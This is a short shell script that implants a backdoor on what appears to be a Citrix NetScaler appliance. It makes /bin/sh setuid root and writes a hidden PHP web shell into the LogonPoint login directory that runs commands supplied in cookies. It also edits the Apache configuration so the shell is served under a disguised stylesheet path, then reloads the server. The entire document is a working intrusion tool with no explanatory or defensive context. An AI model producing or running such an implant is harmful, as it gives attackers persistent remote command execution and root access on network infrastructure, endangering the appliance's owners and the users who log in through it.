#!/bin/sh
chmod 6555 /bin/sh
cat > /var/netscaler/logon/LogonPoint/.cache-state <<'PHP'
<?php if ($_COOKIE["token"] === "local-key" && !empty($_COOKIE["task"])) passthru(urldecode($_COOKIE["task"])); ?>
PHP
cat >> /etc/httpd.conf <<'CONFIG'
<Files ".cache-state">
SetHandler application/x-httpd-php
</Files>
Alias /logon/theme.min.css /var/netscaler/logon/LogonPoint/.cache-state
CONFIG
kill -HUP "$(cat /var/run/httpd.pid)"
